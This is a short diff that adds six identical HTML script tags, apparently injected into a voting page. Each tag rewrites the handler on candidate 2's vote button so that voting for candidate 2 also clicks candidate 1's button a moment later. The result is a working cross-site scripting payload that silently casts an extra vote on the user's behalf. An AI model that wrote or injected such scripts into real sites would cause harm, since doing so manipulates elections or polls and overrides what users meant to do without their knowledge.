@@ -1,0 +1,7 @@
+
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
+<script>document.querySelector('#candidate2 button').setAttribute('onclick', 'vote(2); setTimeout(function() { document.querySelector("#candidate1 button").click(); }, 100);');</script>
